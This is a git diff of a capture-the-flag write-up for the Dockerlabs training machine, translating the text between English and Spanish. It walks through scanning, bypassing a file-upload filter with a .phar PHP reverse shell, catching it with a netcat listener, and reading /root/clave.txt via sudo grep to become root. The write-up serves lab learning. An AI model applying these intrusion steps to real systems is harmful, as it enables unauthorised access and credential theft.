@@ -1,13 +1,13 @@
-# Dockerlabs Machine
+# Dockerlabs
 
-**Level:** Easy
+**Nivel:** Fácil
 
-**Author:** [El Pingüino de Mario](https://www.youtube.com/channel/UCGLfzfKRUsV6BzkrF1kJGsg)
+**Autor:** [El Pingüino de Mario](https://www.youtube.com/channel/UCGLfzfKRUsV6BzkrF1kJGsg)
 
 ------------------
-## Scanning & Enumeration 
+## Escaneo 
 
-We perform a general scan with **nmap** on the victim machine's IP to identify the open ports. 
+Realizamos un escaneo general con **nmap** en la IP de la máquina víctima para identificar los puertos abiertos: 
 
 ```shell
 sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
@@ -16,7 +16,7 @@ PORT   STATE SERVICE REASON
 80/tcp open  http    syn-ack ttl 64
 ```
 
-Next, we use **nmap**'s default scripts to gather more information about the discovered ports:
+A continuación, utilizamos los scripts predeterminados de **nmap** para recopilar más información sobre los puertos identificados:
 
 ```shell
 nmap -sCV -p80 172.17.0.2
@@ -27,13 +27,16 @@ PORT   STATE SERVICE VERSION
 |_http-title: Dockerlabs
 ```
 
-We access the website to inspect its content:
+Evidenciamos un sitio web accedemos a este para inspeccionar su contenido:
 
 ![image](https://github.com/user-attachments/assets/b843c726-78b8-4d8f-8292-0f0adbe4572b)
 
-After reviewing the page code and interacting with it, we did not find any relevant information.
+Después de revisar el código de la página web e interactuar con esta no encontramos información relevante.
 
-We perform **fuzzing** using **gobuster**:
+------------------
+## Enumeración
+
+Realizamos **fuzzing** utilizando **gobuster**:
 
 ```shell
 gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -x html,php,txt,js -b '' -s 200,301
@@ -45,24 +48,26 @@ gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-l
 /machine.php          (Status: 200) [Size: 1361]
 ```
 
-We discover the **machine.php** and **upload.php** files, as well as the **uploads** directory.
+Encontramos los ficheros **machine.php** y **upload.php** y el directorio **uploads**.
 
 --------------
-## Explotation
+## Explotación
 
-Upon reviewing the **machine.php** page, we realize that the form allows file uploads:
+Al revisar la página **machine.php**, observamos que el formulario permite la carga de ficheros:
 
 ![image](https://github.com/user-attachments/assets/6a23ecd1-fdf2-46c0-8566-2e97b447704f)
 
-We prepare the [PHP Pentester monkey reverse shell](https://www.revshells.com/PHP%20PentestMonkey?ip=172.17.0.1&port=4444&shell=%2Fbin%2Fbash&encoding=%2Fbin%2Fbash) and save it as a **PHP** file. 
+Ahora intentamos subir una shell reversa en PHP:
 
-Note that we set the **172.17.0.1** as the **IP** and **4444** as the **PORT** for the listener.
+Configuramos la shell [PHP Pentester monkey reverse shell](https://www.revshells.com/PHP%20PentestMonkey?ip=172.17.0.1&port=4444&shell=%2Fbin%2Fbash&encoding=%2Fbin%2Fbash) y lo guardamos como la extensión **PHP**. 
 
-We try to upload the file and discover the server is restricting uploads to **zip** files
+Nótese que hemos establecido **172.17.0.1** como la **IP** y **4444** como el **PORT** de escucha para el listener.
+
+Sin embargo, la carga de ficheros está restringida a ficheros **zip**
 
 ![image](https://github.com/user-attachments/assets/66e941d2-aeeb-40e6-99bc-e5ac58ed30c6)
 
-Next, we capture the request with [Burp Suite](https://portswigger.net/burp/communitydownload) **Proxy** and perform a new **fuzzing** test using **Intruder** to identify additional allowed **PHP** extensions.
+Procedemos a capturar el request con [Burp Suite](https://portswigger.net/burp/communitydownload) **Proxy** y ejecutar un **fuzzing** con **Intruder** para identificar extensiones **PHP** permitidas:
 
 ![image](https://github.com/user-attachments/assets/542229d9-2438-45ee-bf33-6bcec04b7608)
 
@@ -72,7 +77,9 @@ Next, we capture the request with [Burp Suite](https://portswigger.net/burp/comm
 
 ![image](https://github.com/user-attachments/assets/d8fce90b-0d49-4719-bb81-e1c3698e3c87)
 
-We start a **listener** for the reverse shell using **netcat**: 
+Observamos que podemos subir ficheros con la extensión [**PHAR**](https://www.php.net/manual/es/phar.fileformat.phar.php)
+
+Iniciamos el **listener** para la shell reversa con **netcat**:  
 
 ```shell
 nc -lvnp 4444 
@@ -80,9 +87,7 @@ nc -lvnp 4444
 listening on [any] 4444 ...
 ```
 
-Next, we execute the **reverse shell** file to gain a shell on the victim's machine.
-
-Note that the uploaded files are located in the **uploads** directory.
+Ahora ejecutamos la shell reversa para obtener acceso inicial a la máquina víctima. Nótese que los ficheros almacenados se encuentran ubicados en el directorio **uploads**.
 
 ![image](https://github.com/user-attachments/assets/33c4d87b-80ef-4126-963a-3ae00cc82588)
 
@@ -97,14 +102,14 @@ bash: no job control in this shell
 www-data@8b47fc7b6b14:/$
 ```
 ------------------------------
-### TTY configuration
+### Tratamiento de TTY
 
-We configure the **TTY** for comfortable operation on the console:
+Configuramos el **TTY** para una operación cómoda en la consola:
 
 ```shell
 script /dev/null -c bash 
 ```
-After pressing **Ctrl  +  Z**, execute:
+Presionamos **Ctrl  +  Z**, y luego ejecutamos:
 
 ```shell
 stty raw -echo; fg
@@ -114,19 +119,18 @@ export TERM=xterm
 export SHELL=bash
 ```
 
-Adjust **rows** and **columns** to match the attacker's screen dimensions:
+En los comandos anteriores es necesario ajustar los valores **rows** y **columns**  con los valores obtenidos al ejecutar en una consola de la máquina atacante el comando:
 
 ```shell
 stty size
 ```
 
-Now you can use **Ctrl+L** to clear the screen and **Ctrl+C** as needed.
-
+Ahora podemos utilizar **Ctrl+L** y **Ctrl+C**.
 
 ------------------------------
-## Privileges escalation
+## Escalando privilegios
 
-We use **sudo -l** to check if we can execute anything as `root`:
+Verificamos si es posible ejecutar algún fichero como **root** con **sudo -l**:
 
 ```shell
 sudo -l
@@ -136,11 +140,11 @@ User www-data may run the following commands on 8b47fc7b6b14:
     (root) NOPASSWD: /usr/bin/grep
 ```
 
-We can run `cut` and `grep` as `root` using [GTFOBins for cut](https://gtfobins.github.io/gtfobins/cut/#sudo) or [GTFOBins for grep](https://gtfobins.github.io/gtfobins/grep/#sudo).
+Podemos ejecutar **cut*** o **grep** como **root**. [GTFOBins for cut](https://gtfobins.github.io/gtfobins/cut/#sudo), [GTFOBins for grep](https://gtfobins.github.io/gtfobins/grep/#sudo).
 
-Note that these binaries do not allow privilege escalation, but they can be used to access a restricted file.
+Nótese que ambos binarios no permiten escalar privilegios, sin embargo, si permiten acceder a ficheros restringidos.
 
-We review the system directories `opt` and `etc` to try to find any interesting files.
+Revisamos los directorios del sistema para ver si encontramos algún fichero interesante:
 
 ```shell
 ls /etc/
@@ -163,7 +167,7 @@ ls /opt/
 nota.txt
 ```
 
-We discovered a file named **nota.txt** located in the **opt** directory.
+Encontramos el fichero **nota.txt** ubicado en el directorio **opt**, procedemos a verificar el contenido del mismo:
 
 ```shell
 cat /opt/nota.txt
@@ -171,7 +175,7 @@ cat /opt/nota.txt
 Protege la clave de root, se encuentra en su directorio /root/clave.txt, menos mal que nadie tiene permisos para acceder a ella.
 ```
 
-Next, we try to access the contents of the **clave.txt** file, but, it is restricted.
+Encontramos un segundo fichero **clave.txt**, que seguramente está restringido al usuario **root** dado que se encuentra en el home del usuario.
 
 ```shell
 cat /root/clave.txt
@@ -179,18 +183,20 @@ cat /root/clave.txt
 cat: /root/clave.txt: Permission denied
 ```
 
-We then use the [GTFOBins for grep](https://gtfobins.github.io/gtfobins/grep/#sudo) to access the restricted file.
+Ahora utilizando el binario **grep** y siguiendo los comandos de [GTFOBins for grep](https://gtfobins.github.io/gtfobins/grep/#sudo) intentamos acceder al fichero restringido:
 
 ```shell
 LFILE=/root/clave.txt
 sudo grep '' $LFILE
 ```
 
-We obtain the **root** password and proceed to authenticate as **root** using **su**
+Hemos obtenido la contraseña del usuario **root** y procedemos con la autenticación como **root** usando **su**:
 
 ```shell
 su root
 ```
+
+Hemos obtenido acceso como super usuario:
 
 ```shell
 whoami
